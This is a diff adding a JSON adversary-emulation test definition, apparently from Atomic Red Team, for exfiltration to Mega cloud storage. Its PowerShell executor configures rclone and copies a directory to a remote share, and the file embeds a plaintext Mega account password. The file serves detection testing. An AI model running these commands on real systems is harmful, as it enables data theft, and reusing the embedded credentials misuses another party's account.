@@ -1,0 +1,63 @@
+{
+    "name": "Exfiltrate data with rclone to cloud Storage - Mega (Windows)",
+    "description": "This test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega) See https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/ ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "New-Item #{rclone_config_path}\\rclone -ItemType directory\nNew-Item #{rclone_config_path}\\rclone\\rclone.conf\ncd \"#{rclone_path}\"\n.\\rclone.exe config create #{remote_share} mega\nset-Content #{rclone_config_path}\\rclone\\rclone.conf \"[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}\"\n.\\rclone.exe copy --max-size 1700k \"#{dir_to_copy}\" #{remote_share}:test -v\n",
+        "cleanup_command": "cd \"#{rclone_path}\"\n.\\rclone.exe purge #{remote_share}:test\n.\\rclone.exe config delete #{remote_share}:\nRemove-Item #{rclone_config_path}\\rclone -recurse -force -erroraction silentlycontinue\ncd c:\\\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\" -recurse -force\n",
+        "name": "powershell",
+        "elevation_required": false,
+        "type": "Command Executor"
+    },
+    "id": "T1567.002",
+    "tactics": [
+        "Exfiltration"
+    ],
+    "technique": "Exfiltration to Cloud Storage",
+    "source": "ART",
+    "uuid": "8529ee44-279a-4a19-80bf-b846a40dda58",
+    "arguments": {
+        "rclone_path": {
+            "description": "Directory of rclone.exe",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\rclone-v*\\"
+        },
+        "rclone_config_path": {
+            "description": "Path to rclone's config file (default should be fine)",
+            "type": "path",
+            "default": "$env:appdata"
+        },
+        "dir_to_copy": {
+            "description": "Directory to copy",
+            "type": "string",
+            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002"
+        },
+        "mega_user_account": {
+            "description": "Mega user account",
+            "type": "string",
+            "default": "atomictesting@outlook.com"
+        },
+        "mega_user_password": {
+            "description": "Mega user password",
+            "type": "string",
+            "default": "vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA"
+        },
+        "remote_share": {
+            "description": "Remote Mega share",
+            "type": "string",
+            "default": "T1567002"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "rclone must exist at (#{rclone_path})\n",
+            "prereq_command": "if (Test-Path \"#{rclone_path}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\"\nExpand-archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\\" -force\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
